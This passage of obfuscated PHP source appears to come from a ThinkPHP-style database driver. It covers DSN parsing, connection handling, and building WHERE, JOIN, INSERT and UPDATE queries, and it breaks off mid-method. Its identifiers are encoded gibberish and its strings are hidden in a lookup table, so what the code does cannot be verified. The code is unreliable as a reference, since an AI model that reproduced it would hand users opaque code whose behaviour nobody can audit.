=> isset($‚ÌÃ¦[$´°ÈÍ¶¢[1009]]) ? $‚ÌÃ¦[$´°ÈÍ¶¢[1009]] : array()); } elseif (empty($‚ÌÃ¦)) { if (think_config($´°ÈÍ¶¢[1010]) && $´°ÈÍ¶¢[999] != strtolower(think_config($´°ÈÍ¶¢[1011]))) { $‚ÌÃ¦ = $this->parseDSN(think_config($´°ÈÍ¶¢[1010])); } else { $‚ÌÃ¦ = array($´°ÈÍ¶¢[996] => think_config($´°ÈÍ¶¢[1011]), $´°ÈÍ¶¢[921] => think_config($´°ÈÍ¶¢[1012]), $´°ÈÍ¶¢[922] => think_config($´°ÈÍ¶¢[1013]), $´°ÈÍ¶¢[919] => think_config($´°ÈÍ¶¢[1014]), $´°ÈÍ¶¢[920] => think_config($´°ÈÍ¶¢[1015]), $´°ÈÍ¶¢[21] => think_config($´°ÈÍ¶¢[292]), $´°ÈÍ¶¢[951] => think_config($´°ÈÍ¶¢[1010]), $´°ÈÍ¶¢[17] => think_config($´°ÈÍ¶¢[1016])); } } return $‚ÌÃ¦; } protected function initConnect($©™›©Ó = true) { if (1 == think_config($_SERVER[ ÇƒŠìÀ][22])) { $this->_linkID = $this->multiConnect($©™›©Ó); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $éŞ™³Â => $ïÖÓÎÃ) { $this->_linkID = $ïÖÓÎÃ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ñÏÇºËÔ = false) { $ÜĞì†ÌÖ =& $_SERVER[ ÇƒŠìÀ]; static $Õ¢Ë˜÷È = array(); static $õÚÆÜ = -1; if (empty($Õ¢Ë˜÷È)) { foreach ($this->config as $ŒÄ•ç¢Î => $ĞøË¬¶®) { $Õ¢Ë˜÷È[$ŒÄ•ç¢Î] = explode($ÜĞì†ÌÖ[50], $ĞøË¬¶®); } } if (think_config($ÜĞì†ÌÖ[1017])) { if ($ñÏÇºËÔ || think_config($ÜĞì†ÌÖ[441]) === !0) { $æÇö¬Èä = floor(mt_rand(0, think_config($ÜĞì†ÌÖ[1018]) - 1)); $õÚÆÜ = $æÇö¬Èä; } else { if (is_numeric(think_config($ÜĞì†ÌÖ[1019]))) { $æÇö¬Èä = think_config($ÜĞì†ÌÖ[1019]); } else { $æÇö¬Èä = floor(mt_rand(think_config($ÜĞì†ÌÖ[1018]), count($Õ¢Ë˜÷È[$ÜĞì†ÌÖ[919]]) - 1)); } } } else { $æÇö¬Èä = floor(mt_rand(0, count($Õ¢Ë˜÷È[$ÜĞì†ÌÖ[919]]) - 1)); $õÚÆÜ = $æÇö¬Èä; } $æÇö¬Èä = $õÚÆÜ !== -1 ? $õÚÆÜ : $æÇö¬Èä; $òú¼Ü¾Ç = array($ÜĞì†ÌÖ[921] => isset($Õ¢Ë˜÷È[$ÜĞì†ÌÖ[921]][$æÇö¬Èä]) ? $Õ¢Ë˜÷È[$ÜĞì†ÌÖ[921]][$æÇö¬Èä] : $Õ¢Ë˜÷È[$ÜĞì†ÌÖ[921]][0], $ÜĞì†ÌÖ[922] => isset($Õ¢Ë˜÷È[$ÜĞì†ÌÖ[922]][$æÇö¬Èä]) ? $Õ¢Ë˜÷È[$ÜĞì†ÌÖ[922]][$æÇö¬Èä] : $Õ¢Ë˜÷È[$ÜĞì†ÌÖ[922]][0], $ÜĞì†ÌÖ[919] => isset($Õ¢Ë˜÷È[$ÜĞì†ÌÖ[919]][$æÇö¬Èä]) ? $Õ¢Ë˜÷È[$ÜĞì†ÌÖ[919]][$æÇö¬Èä] : $Õ¢Ë˜÷È[$ÜĞì†ÌÖ[919]][0], $ÜĞì†ÌÖ[920] => isset($Õ¢Ë˜÷È[$ÜĞì†ÌÖ[920]][$æÇö¬Èä]) ? $Õ¢Ë˜÷È[$ÜĞì†ÌÖ[920]][$æÇö¬Èä] : $Õ¢Ë˜÷È[$ÜĞì†ÌÖ[920]][0], $ÜĞì†ÌÖ[21] => isset($Õ¢Ë˜÷È[$ÜĞì†ÌÖ[21]][$æÇö¬Èä]) ? $Õ¢Ë˜÷È[$ÜĞì†ÌÖ[21]][$æÇö¬Èä] : $Õ¢Ë˜÷È[$ÜĞì†ÌÖ[21]][0], $ÜĞì†ÌÖ[951] => isset($Õ¢Ë˜÷È[$ÜĞì†ÌÖ[951]][$æÇö¬Èä]) ? $Õ¢Ë˜÷È[$ÜĞì†ÌÖ[951]][$æÇö¬Èä] : $Õ¢Ë˜÷È[$ÜĞì†ÌÖ[951]][0], $ÜĞì†ÌÖ[17] => isset($Õ¢Ë˜÷È[$ÜĞì†ÌÖ[17]][$æÇö¬Èä]) ? $Õ¢Ë˜÷È[$ÜĞì†ÌÖ[17]][$æÇö¬Èä] : $Õ¢Ë˜÷È[$ÜĞì†ÌÖ[17]][0]); return $this->connect($òú¼Ü¾Ç, $æÇö¬Èä); } public function parseDSN($§ŒâôÎÕ) { $ä’‚åúù =& $_SERVER[ ÇƒŠìÀ]; if (empty($§ŒâôÎÕ)) { return !1; } $ÆÓ—ˆ÷Ñ = parse_url($§ŒâôÎÕ); if ($ÆÓ—ˆ÷Ñ[$ä’‚åúù[197]]) { $¯¬¨˜Œ¾ = array($ä’‚åúù[996] => $ÆÓ—ˆ÷Ñ[$ä’‚åúù[197]], $ä’‚åúù[921] => isset($ÆÓ—ˆ÷Ñ[$ä’‚åúù[632]]) ? $ÆÓ—ˆ÷Ñ[$ä’‚åúù[632]] : $ä’‚åúù[12], $ä’‚åúù[922] => isset($ÆÓ—ˆ÷Ñ[$ä’‚åúù[1020]]) ? $ÆÓ—ˆ÷Ñ[$ä’‚åúù[1020]] : $ä’‚åúù[12], $ä’‚åúù[919] => isset($ÆÓ—ˆ÷Ñ[$ä’‚åúù[198]]) ? $ÆÓ—ˆ÷Ñ[$ä’‚åúù[198]] : $ä’‚åúù[12], $ä’‚åúù[920] => isset($ÆÓ—ˆ÷Ñ[$ä’‚åúù[199]]) ? $ÆÓ—ˆ÷Ñ[$ä’‚åúù[199]] : $ä’‚åúù[12], $ä’‚åúù[21] => isset($ÆÓ—ˆ÷Ñ[$ä’‚åúù[86]]) ? substr($ÆÓ—ˆ÷Ñ[$ä’‚åúù[86]], 1) : $ä’‚åúù[12]); } else { preg_match($ä’‚åúù[1021], trim($§ŒâôÎÕ), $¡áÇìÑ»); $¯¬¨˜Œ¾ = array($ä’‚åúù[996] => $¡áÇìÑ»[1], $ä’‚åúù[921] => $¡áÇìÑ»[2], $ä’‚åúù[922] => $¡áÇìÑ»[3], $ä’‚åúù[919] => $¡áÇìÑ»[4], $ä’‚åúù[920] => $¡áÇìÑ»[5], $ä’‚åúù[21] => $¡áÇìÑ»[6]); } $¯¬¨˜Œ¾[$ä’‚åúù[951]] = $ä’‚åúù[12]; return $¯¬¨˜Œ¾; } protected function debug() { $×”ø×Ì² =& $_SERVER[ ÇƒŠìÀ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $×”ø×Ì²[1022]; if (think_config($×”ø×Ì²[1023])) { think_status($×”ø×Ì²[1024]); think_trace($this->queryStr . $×”ø×Ì²[1025] . think_status($×”ø×Ì²[24], $×”ø×Ì²[1024], 6) . $×”ø×Ì²[1026], $×”ø×Ì²[12], $×”ø×Ì²[1027]); } } protected function parseLock($ÃÖ•ùŒ = false) { $Ö¢”â• =& $_SERVER[ ÇƒŠìÀ]; if (!$ÃÖ•ùŒ) { return $Ö¢”â•[12]; } if ($Ö¢”â•[953] == $this->dbType) { return $Ö¢”â•[1028]; } return $Ö¢”â•[1029]; } protected function parseSet($ÍæÙáíÌ) { $ÆîĞ» =& $_SERVER[ ÇƒŠìÀ]; foreach ($ÍæÙáíÌ as $°ÄåøË => $ê½†‹•) { if (is_array($ê½†‹•) && $ÆîĞ»[343] == $ê½†‹•[0]) { $¬¾ı›¶å[] = $this->parseKey($°ÄåøË) . $ÆîĞ»[917] . $ê½†‹•[1]; } elseif (is_scalar($ê½†‹•) || is_null($ê½†‹•)) { $¬¾ı›¶å[] = $this->parseKey($°ÄåøË) . $ÆîĞ»[917] . $this->parseValue($ê½†‹•); } } return $ÆîĞ»[1030] . implode($ÆîĞ»[50], $¬¾ı›¶å); } protected function bindParam($ÄğÄá«, $â‚œÑ®Û) { $this->bind[$_SERVER[ ÇƒŠìÀ][4] . $ÄğÄá«] = $â‚œÑ®Û; } protected function parseBind($‹õ‚Şà¹) { $‹õ‚Şà¹ = array_merge($this->bind, $‹õ‚Şà¹); $this->bind = array(); return $‹õ‚Şà¹; } function parseKey(&$Ñ™€Ã§, $ÍªÏÎúê = true) { if ($ÍªÏÎúê) { $Ñ™€Ã§ = $this->parseKeyCheck($Ñ™€Ã§); } return $Ñ™€Ã§; } function parseKeyCheck($„Âé¥¼Ô) { $ØÏ´¸İÜ =& $_SERVER[ ÇƒŠìÀ]; $„Âé¥¼Ô = trim($„Âé¥¼Ô); if (!preg_match($ØÏ´¸İÜ[1031], $„Âé¥¼Ô)) { think_exception($ØÏ´¸İÜ[1032] . $„Âé¥¼Ô); } return $„Âé¥¼Ô; } protected function parseValue($é´¬…õ¢) { $ßí¢á¼Æ =& $_SERVER[ ÇƒŠìÀ]; if (is_string($é´¬…õ¢)) { $é´¬…õ¢ = $ßí¢á¼Æ[992] . $this->escapeString($é´¬…õ¢) . $ßí¢á¼Æ[992]; } elseif (isset($é´¬…õ¢[0]) && is_string($é´¬…õ¢[0]) && strtolower($é´¬…õ¢[0]) == $ßí¢á¼Æ[343]) { $é´¬…õ¢ = $this->escapeString($é´¬…õ¢[1]); } elseif (is_array($é´¬…õ¢)) { $é´¬…õ¢ = array_map(array($this, $ßí¢á¼Æ[993]), $é´¬…õ¢); } elseif (is_bool($é´¬…õ¢)) { $é´¬…õ¢ = $é´¬…õ¢ ? $ßí¢á¼Æ[90] : $ßí¢á¼Æ[214]; } elseif (is_null($é´¬…õ¢)) { $é´¬…õ¢ = $ßí¢á¼Æ[105]; } return $é´¬…õ¢; } protected function parseField($íÈÙİ) { $şÊ¡¼í =& $_SERVER[ ÇƒŠìÀ]; if (is_string($íÈÙİ) && strpos($íÈÙİ, $şÊ¡¼í[50])) { $íÈÙİ = explode($şÊ¡¼í[50], $íÈÙİ); } if (is_array($íÈÙİ)) { $ìÛè¯‚§ = array(); foreach ($íÈÙİ as $ö¶ñóÕ => $İš¢ğŸã) { if (!is_numeric($ö¶ñóÕ)) { $ìÛè¯‚§[] = $this->parseKey($ö¶ñóÕ, !1) . $şÊ¡¼í[1033] . $this->parseKey($İš¢ğŸã); } else { $ìÛè¯‚§[] = $this->parseKey($İš¢ğŸã); } } $Œ±ÀÓ» = implode($şÊ¡¼í[50], $ìÛè¯‚§); } elseif (is_string($íÈÙİ) && !empty($íÈÙİ)) { $Œ±ÀÓ» = $íÈÙİ; } else { $Œ±ÀÓ» = $şÊ¡¼í[205]; } return $Œ±ÀÓ»; } protected function parseTable($ò•«‘ª) { $«â‚Şæ =& $_SERVER[ ÇƒŠìÀ]; if (is_array($ò•«‘ª)) { $½³Ô€×™ = array(); foreach ($ò•«‘ª as $ë»‘‘Õ® => $ØƒßºÁß) { if (!is_numeric($ë»‘‘Õ®)) { $½³Ô€×™[] = $this->parseKey($ë»‘‘Õ®) . $«â‚Şæ[53] . $this->parseKey($ØƒßºÁß); } else { $½³Ô€×™[] = $this->parseKey($ë»‘‘Õ®); } } $ò•«‘ª = $½³Ô€×™; } elseif (is_string($ò•«‘ª)) { if (strstr($ò•«‘ª, $«â‚Şæ[53])) { return $ò•«‘ª; } $ò•«‘ª = explode($«â‚Şæ[50], $ò•«‘ª); array_walk($ò•«‘ª, array($this, $«â‚Şæ[939])); } return $«â‚Şæ[933] . trim(implode($«â‚Şæ[1034], $ò•«‘ª), $«â‚Şæ[431]) . $«â‚Şæ[933]; } protected function parseWhere($ûãŞÊÒ½) { $£È¯óäõ =& $_SERVER[ ÇƒŠìÀ]; $—ÏÈª— = $£È¯óäõ[12]; if (is_string($ûãŞÊÒ½)) { $—ÏÈª— = $ûãŞÊÒ½; } else { $Ó§êÂÈ = isset($ûãŞÊÒ½[$£È¯óäõ[1035]]) ? strtoupper($ûãŞÊÒ½[$£È¯óäõ[1035]]) : $£È¯óäõ[12]; if (in_array($Ó§êÂÈ, array($£È¯óäõ[1036], $£È¯óäõ[1037], $£È¯óäõ[1038]))) { $Ó§êÂÈ = $£È¯óäõ[53] . $Ó§êÂÈ . $£È¯óäõ[53]; unset($ûãŞÊÒ½[$£È¯óäõ[1035]]); } else { $Ó§êÂÈ = $£È¯óäõ[1039]; } foreach ($ûãŞÊÒ½ as $³Óø± => $ò·“¨Ù) { $—ÏÈª— .= $£È¯óäõ[323]; if (is_numeric($³Óø±)) { $³Óø± = $£È¯óäõ[1040]; } if (0 === strpos($³Óø±, $£È¯óäõ[11])) { $—ÏÈª— .= $this->parseThinkWhere($³Óø±, $ò·“¨Ù); } else { if (!preg_match($£È¯óäõ[1041], trim($³Óø±))) { think_exception(think_lang($£È¯óäõ[1042]) . $£È¯óäõ[4] . $³Óø±); } $éÂŞ€Á€ = is_array($ò·“¨Ù) && isset($ò·“¨Ù[$£È¯óäõ[1043]]); $³Óø± = trim($³Óø±); if (strpos($³Óø±, $£È¯óäõ[329])) { $¯Æöˆ°ß = explode($£È¯óäõ[329], $³Óø±); $¨–šœå = array(); foreach ($¯Æöˆ°ß as $úû˜³ => $Ò¯ÅÒÙ) { $ˆºğ“ôŸ = $éÂŞ€Á€ ? $ò·“¨Ù[$úû˜³] : $ò·“¨Ù; $¨–šœå[] = $£È¯óäõ[306] . $this->parseWhereItem($this->parseKey($Ò¯ÅÒÙ), $ˆºğ“ôŸ) . $£È¯óäõ[938]; } $—ÏÈª— .= implode($£È¯óäõ[1044], $¨–šœå); } elseif (strpos($³Óø±, $£È¯óäõ[330])) { $¯Æöˆ°ß = explode($£È¯óäõ[330], $³Óø±); $¨–šœå = array(); foreach ($¯Æöˆ°ß as $úû˜³ => $Ò¯ÅÒÙ) { $ˆºğ“ôŸ = $éÂŞ€Á€ ? $ò·“¨Ù[$úû˜³] : $ò·“¨Ù; $¨–šœå[] = $£È¯óäõ[306] . $this->parseWhereItem($this->parseKey($Ò¯ÅÒÙ), $ˆºğ“ôŸ) . $£È¯óäõ[938]; } $—ÏÈª— .= implode($£È¯óäõ[1039], $¨–šœå); } else { $—ÏÈª— .= $this->parseWhereItem($this->parseKey($³Óø±), $ò·“¨Ù); } } $—ÏÈª— .= $£È¯óäõ[324] . $Ó§êÂÈ; } $—ÏÈª— = substr($—ÏÈª—, 0, -strlen($Ó§êÂÈ)); } return empty($—ÏÈª—) ? $£È¯óäõ[12] : $£È¯óäõ[1045] . $—ÏÈª—; } protected function parseWhereItem($ğçşØúœ, $şûÁ­Åä) { $ŞªÙÅç£ =& $_SERVER[ ÇƒŠìÀ]; $ôçÅø¥¸ = $ŞªÙÅç£[12]; if (is_array($şûÁ­Åä)) { if (is_string($şûÁ­Åä[0])) { $¢ÛÑûé¤ = strtolower($şûÁ­Åä[0]); if (in_array($şûÁ­Åä[0], array($ŞªÙÅç£[917], $ŞªÙÅç£[1046], $ŞªÙÅç£[1047], $ŞªÙÅç£[1048], $ŞªÙÅç£[1049], $ŞªÙÅç£[1050]))) { $ôçÅø¥¸ .= $ğçşØúœ . $ŞªÙÅç£[53] . $şûÁ­Åä[0] . $ŞªÙÅç£[53] . $this->parseValue($şûÁ­Åä[1]); } elseif (preg_match($ŞªÙÅç£[1051], $şûÁ­Åä[0])) { $ôçÅø¥¸ .= $ğçşØúœ . $ŞªÙÅç£[53] . $this->exp[$¢ÛÑûé¤] . $ŞªÙÅç£[53] . $this->parseValue($şûÁ­Åä[1]); } elseif (preg_match($ŞªÙÅç£[1052], $şûÁ­Åä[0])) { if (is_array($şûÁ­Åä[1])) { $¯”ò¾ª = isset($şûÁ­Åä[2]) ? strtoupper($şûÁ­Åä[2]) : $ŞªÙÅç£[1037]; if (in_array($¯”ò¾ª, array($ŞªÙÅç£[1036], $ŞªÙÅç£[1037], $ŞªÙÅç£[1038]))) { $Æš¢²úÚ = array(); foreach ($şûÁ­Åä[1] as $ÍÛ†’ß½) { $Æš¢²úÚ[] = $ğçşØúœ . $ŞªÙÅç£[53] . $this->exp[$¢ÛÑûé¤] . $ŞªÙÅç£[53] . $this->parseValue($ÍÛ†’ß½); } $ôçÅø¥¸ .= $ŞªÙÅç£[306] . implode($ŞªÙÅç£[53] . $¯”ò¾ª . $ŞªÙÅç£[53], $Æš¢²úÚ) . $ŞªÙÅç£[938]; } } else { $ôçÅø¥¸ .= $ğçşØúœ . $ŞªÙÅç£[53] . $this->exp[$¢ÛÑûé¤] . $ŞªÙÅç£[53] . $this->parseValue($şûÁ­Åä[1]); } } elseif ($ŞªÙÅç£[343] == $¢ÛÑûé¤) { $ôçÅø¥¸ .= $ŞªÙÅç£[936] . $ğçşØúœ . $ŞªÙÅç£[53] . $şûÁ­Åä[1] . $ŞªÙÅç£[1053]; } elseif (preg_match($ŞªÙÅç£[1054], $şûÁ­Åä[0])) { $ôçÅø¥¸ .= $şûÁ­Åä[0]; } elseif (preg_match($ŞªÙÅç£[1055], $şûÁ­Åä[0])) { if (isset($şûÁ­Åä[2]) && $ŞªÙÅç£[343] == $şûÁ­Åä[2]) { $ôçÅø¥¸ .= $ğçşØúœ . $ŞªÙÅç£[53] . $this->exp[$¢ÛÑûé¤] . $ŞªÙÅç£[53] . $şûÁ­Åä[1]; } else { if (is_string($şûÁ­Åä[1])) { $şûÁ­Åä[1] = explode($ŞªÙÅç£[50], $şûÁ­Åä[1]); } $†Å¾¤­ = implode($ŞªÙÅç£[50], $this->parseValue($şûÁ­Åä[1])); $ôçÅø¥¸ .= $ğçşØúœ . $ŞªÙÅç£[53] . $this->exp[$¢ÛÑûé¤] . $ŞªÙÅç£[936] . $†Å¾¤­ . $ŞªÙÅç£[938]; } } elseif (preg_match($ŞªÙÅç£[1056], $şûÁ­Åä[0])) { $õÊú÷¯ = is_string($şûÁ­Åä[1]) ? explode($ŞªÙÅç£[50], $şûÁ­Åä[1]) : $şûÁ­Åä[1]; $ôçÅø¥¸ .= $ŞªÙÅç£[936] . $ğçşØúœ . $ŞªÙÅç£[53] . $this->exp[$¢ÛÑûé¤] . $ŞªÙÅç£[53] . $this->parseValue($õÊú÷¯[0]) . $ŞªÙÅç£[1039] . $this->parseValue($õÊú÷¯[1]) . $ŞªÙÅç£[324]; } else { think_exception(think_lang($ŞªÙÅç£[1042]) . $ŞªÙÅç£[4] . $şûÁ­Åä[0]); } } else { $Ü‡°¨ã¨ = count($şûÁ­Åä); $¥šæÉ¶ã = $ŞªÙÅç£[12]; if (is_string($şûÁ­Åä[$Ü‡°¨ã¨ - 1])) { $¥šæÉ¶ã = isset($şûÁ­Åä[$Ü‡°¨ã¨ - 1]) ? strtoupper($şûÁ­Åä[$Ü‡°¨ã¨ - 1]) : $ŞªÙÅç£[12]; if (in_array($¥šæÉ¶ã, array($ŞªÙÅç£[1036], $ŞªÙÅç£[1037], $ŞªÙÅç£[1038]))) { $Ü‡°¨ã¨ = $Ü‡°¨ã¨ - 1; } } else { $¥šæÉ¶ã = $ŞªÙÅç£[1036]; } for ($¸“§–¨ = 0; $¸“§–¨ < $Ü‡°¨ã¨; $¸“§–¨++) { $õÊú÷¯ = is_array($şûÁ­Åä[$¸“§–¨]) ? $şûÁ­Åä[$¸“§–¨][1] : $şûÁ­Åä[$¸“§–¨]; if ($ŞªÙÅç£[343] == strtolower($şûÁ­Åä[$¸“§–¨][0])) { $ôçÅø¥¸ .= $ŞªÙÅç£[306] . $ğçşØúœ . $ŞªÙÅç£[53] . $õÊú÷¯ . $ŞªÙÅç£[1053] . $¥šæÉ¶ã . $ŞªÙÅç£[53]; } else { $è²ù³½® = is_array($şûÁ­Åä[$¸“§–¨]) ? $this->exp[strtolower($şûÁ­Åä[$¸“§–¨][0])] : $ŞªÙÅç£[917]; if (!$è²ù³½® && is_array($şûÁ­Åä[$¸“§–¨]) && in_array($şûÁ­Åä[$¸“§–¨][0], array($ŞªÙÅç£[917], $ŞªÙÅç£[1046], $ŞªÙÅç£[1047], $ŞªÙÅç£[1048], $ŞªÙÅç£[1049], $ŞªÙÅç£[1050]))) { $è²ù³½® = $şûÁ­Åä[$¸“§–¨][0]; } $ôçÅø¥¸ .= $ŞªÙÅç£[306] . $ğçşØúœ . $ŞªÙÅç£[53] . $è²ù³½® . $ŞªÙÅç£[53] . $this->parseValue($õÊú÷¯) . $ŞªÙÅç£[1053] . $¥šæÉ¶ã . $ŞªÙÅç£[53]; } } $ôçÅø¥¸ = substr($ôçÅø¥¸, 0, -4); } } else { $ôçÅø¥¸ .= $ğçşØúœ . $ŞªÙÅç£[1057] . $this->parseValue($şûÁ­Åä); } return $ôçÅø¥¸; } protected function parseThinkWhere($ù“²î¿è, $’Ÿ´ïÀä) { $ñÖÚ‰™ =& $_SERVER[ ÇƒŠìÀ]; $Îòòíê = $ñÖÚ‰™[12]; switch ($ù“²î¿è) { case $ñÖÚ‰™[398]: $Îòòíê = $’Ÿ´ïÀä; break; case $ñÖÚ‰™[1040]: $Îòòíê = is_string($’Ÿ´ïÀä) ? $’Ÿ´ïÀä : substr($this->parseWhere($’Ÿ´ïÀä), 6); break; case $ñÖÚ‰™[1058]: parse_str($’Ÿ´ïÀä, $Õè£Ü×İ); if (isset($Õè£Ü×İ[$ñÖÚ‰™[1035]])) { $Ü«è¥šÍ = $ñÖÚ‰™[53] . strtoupper($Õè£Ü×İ[$ñÖÚ‰™[1035]]) . $ñÖÚ‰™[53]; unset($Õè£Ü×İ[$ñÖÚ‰™[1035]]); } else { $Ü«è¥šÍ = $ñÖÚ‰™[1039]; } $ ”œàÓØ = array(); foreach ($Õè£Ü×İ as $âõ°€üµ => $ù¸°¿ÄÉ) { $ ”œàÓØ[] = $this->parseKey($âõ°€üµ) . $ñÖÚ‰™[1057] . $this->parseValue($ù¸°¿ÄÉ); } $Îòòíê = implode($Ü«è¥šÍ, $ ”œàÓØ); break; } return $Îòòíê; } protected function parseLimit($¡óÛÑïû) { $ï´˜ôòó =& $_SERVER[ ÇƒŠìÀ]; return !empty($¡óÛÑïû) ? $ï´˜ôòó[51] . $¡óÛÑïû . $ï´˜ôòó[53] : $ï´˜ôòó[12]; } protected function parseJoin($¤Ç¼¥˜ˆ) { $ü‹´Ò¯“ =& $_SERVER[ ÇƒŠìÀ]; $ß¹£û•Ú = $ü‹´Ò¯“[12]; if (!empty($¤Ç¼¥˜ˆ)) { if (is_array($¤Ç¼¥˜ˆ)) { foreach ($¤Ç¼¥˜ˆ as $Ì¢–îš³ => $ôáÒ÷Ğ) { if (!1 !== stripos($ôáÒ÷Ğ, $ü‹´Ò¯“[1059])) { $ß¹£û•Ú .= $ü‹´Ò¯“[53] . $ôáÒ÷Ğ; } else { $ß¹£û•Ú .= $ü‹´Ò¯“[1060] . $ôáÒ÷Ğ; } } } else { $ß¹£û•Ú .= $ü‹´Ò¯“[1060] . $¤Ç¼¥˜ˆ; } } $ß¹£û•Ú = preg_replace($ü‹´Ò¯“[1061], think_config($ü‹´Ò¯“[965]) . $ü‹´Ò¯“[1062], $ß¹£û•Ú); return $ß¹£û•Ú; } protected function parseOrder($Ï›—Åú¿) { $õ½¥Ï¹Ó =& $_SERVER[ ÇƒŠìÀ]; if (is_array($Ï›—Åú¿)) { $ÎŒõÕ‹† = array(); foreach ($Ï›—Åú¿ as $ÌàÉÓäÚ => $ƒÓ¸ı¾‡) { if (is_numeric($ÌàÉÓäÚ)) { $ÎŒõÕ‹†[] = $this->parseKey($ƒÓ¸ı¾‡); } else { $ƒÓ¸ı¾‡ = in_array(strtoupper(trim($ƒÓ¸ı¾‡)), array($õ½¥Ï¹Ó[1063], $õ½¥Ï¹Ó[1064])) ? $õ½¥Ï¹Ó[53] . $ƒÓ¸ı¾‡ : $õ½¥Ï¹Ó[12]; if (preg_match($õ½¥Ï¹Ó[1065], $ÌàÉÓäÚ)) { $ÎŒõÕ‹†[] = $this->parseKey($ÌàÉÓäÚ) . $ƒÓ¸ı¾‡; } else { think_exception($õ½¥Ï¹Ó[1066] . $ÌàÉÓäÚ); } } } $Ï›—Åú¿ = implode($õ½¥Ï¹Ó[50], $ÎŒõÕ‹†); } return !empty($Ï›—Åú¿) ? $õ½¥Ï¹Ó[1067] . $Ï›—Åú¿ : $õ½¥Ï¹Ó[12]; } protected function parseGroup($ŠÂå›Ø¸) { $¥½ø¡ßü =& $_SERVER[ ÇƒŠìÀ]; return !empty($ŠÂå›Ø¸) ? $¥½ø¡ßü[1068] . $ŠÂå›Ø¸ : $¥½ø¡ßü[12]; } protected function parseHaving($ã±áæñã) { $Õ‡æœ“¹ =& $_SERVER[ ÇƒŠìÀ]; return !empty($ã±áæñã) ? $Õ‡æœ“¹[1069] . $ã±áæñã : $Õ‡æœ“¹[12]; } protected function parseComment($µéú³ò¡) { $Ü‘ŒŸÛ¹ =& $_SERVER[ ÇƒŠìÀ]; return !empty($µéú³ò¡) ? $Ü‘ŒŸÛ¹[1070] . $µéú³ò¡ . $Ü‘ŒŸÛ¹[1071] : $Ü‘ŒŸÛ¹[12]; } protected function parseDistinct($ì¢˜”Ø‰) { $˜‘¨“Ö¶ =& $_SERVER[ ÇƒŠìÀ]; return !empty($ì¢˜”Ø‰) ? $˜‘¨“Ö¶[1072] : $˜‘¨“Ö¶[12]; } protected function parseUnion($Ş¯ñßóœ) { $³ş¸ı»Û =& $_SERVER[ ÇƒŠìÀ]; if (empty($Ş¯ñßóœ)) { return $³ş¸ı»Û[12]; } if (isset($Ş¯ñßóœ[$³ş¸ı»Û[394]])) { $½Í¡ò‘¶ = $³ş¸ı»Û[1073]; unset($Ş¯ñßóœ[$³ş¸ı»Û[394]]); } else { $½Í¡ò‘¶ = $³ş¸ı»Û[1074]; } foreach ($Ş¯ñßóœ as $¹ª’œ–¬) { $çëÁ™ì½[] = $½Í¡ò‘¶ . (is_array($¹ª’œ–¬) ? $this->buildSelectSql($¹ª’œ–¬) : $¹ª’œ–¬); } return implode($³ş¸ı»Û[53], $çëÁ™ì½); } public function insert($Ù¬¦€°İ, $·íóËÚ¢ = array(), $ÇªñêŒ = false) { $ş‰²“ğ =& $_SERVER[ ÇƒŠìÀ]; $¦òŞ•Ô• = $ã¼º¾ã¤ = array(); $this->model = $·íóËÚ¢[$ş‰²“ğ[327]]; foreach ($Ù¬¦€°İ as $Èö±Êô => $ÑÊÕŸ›²) { if (is_array($ÑÊÕŸ›²) && $ş‰²“ğ[343] == $ÑÊÕŸ›²[0]) { $ã¼º¾ã¤[] = $this->parseKey($Èö±Êô); $¦òŞ•Ô•[] = $ÑÊÕŸ›²[1]; } elseif (is_scalar($ÑÊÕŸ›²) || is_null($ÑÊÕŸ›²)) { $ã¼º¾ã¤[] = $this->parseKey($Èö±Êô); $¦òŞ•Ô•[] = $this->parseValue($ÑÊÕŸ›²); } } $ÍÔ¹áÌö = ($ÇªñêŒ ? $ş‰²“ğ[940] : $ş‰²“ğ[941]) . $ş‰²“ğ[942] . $this->parseTable($·íóËÚ¢[$ş‰²“ğ[325]]) . $ş‰²“ğ[936] . implode($ş‰²“ğ[50], $ã¼º¾ã¤) . $ş‰²“ğ[937] . implode($ş‰²“ğ[50], $¦òŞ•Ô•) . $ş‰²“ğ[938]; $ÍÔ¹áÌö .= $this->parseLock(isset($·íóËÚ¢[$ş‰²“ğ[873]]) ? $·íóËÚ¢[$ş‰²“ğ[873]] : !1); $ÍÔ¹áÌö .= $this->parseComment(!empty($·íóËÚ¢[$ş‰²“ğ[400]]) ? $·íóËÚ¢[$ş‰²“ğ[400]] : $ş‰²“ğ[12]); return $this->execute($ÍÔ¹áÌö, $this->parseBind(!empty($·íóËÚ¢[$ş‰²“ğ[331]]) ? $·íóËÚ¢[$ş‰²“ğ[331]] : array())); } public function selectInsert($¯ì€ã·à, $»‰‹ßè©, $ŠšÛ‡¾ = array()) { $ÉÁ´úìÜ =& $_SERVER[ ÇƒŠìÀ]; $this->model = $ŠšÛ‡¾[$ÉÁ´úìÜ[327]]; if (is_string($¯ì€ã·à)) { $¯ì€ã·à = explode($ÉÁ´úìÜ[50], $¯ì€ã·à); } array_walk($¯ì€ã·à, array($this, $ÉÁ´úìÜ[939])); $’äœ”ˆ = $ÉÁ´úìÜ[1075] . $this->parseTable($»‰‹ßè©) . $ÉÁ´úìÜ[936] . implode($ÉÁ´úìÜ[50], $¯ì€ã·à) . $ÉÁ´úìÜ[1053]; $’äœ”ˆ .= $this->buildSelectSql($ŠšÛ‡¾); return $this->execute($’äœ”ˆ, $this->parseBind(!empty($ŠšÛ‡¾[$ÉÁ´úìÜ[331]]) ? $ŠšÛ‡¾[$ÉÁ´úìÜ[331]] : array())); } public function update($•‰Ú‚¤¾, $«í°ÚÊø) { $—÷Ê‘»À =& $_SERVER[ ÇƒŠìÀ]; $this->model = $«í°ÚÊø[$—÷Ê‘»À[327]]; $ïƒ²òÉ¬ = $—÷Ê‘»À[1076] . $this->parseTable($«í°ÚÊø[$—÷Ê‘»À[325]]) . $this->parseSet($•‰Ú‚¤¾) . $this->parseWhere(!empty($«í°ÚÊø[$—÷Ê‘»À[321]]) ? $«í°ÚÊø[$—÷Ê‘»À[321]] : $—÷Ê‘»À[12]) . $this->parseOrder(!empty($«í°ÚÊø[$—÷Ê‘»À[411]]) ? $«í°ÚÊø[$—÷Ê‘»À[411]] : $—÷Ê‘»À[12]) . $this->parseLimit(!empty($«í°ÚÊø[$—÷Ê‘»À[338]]) ? 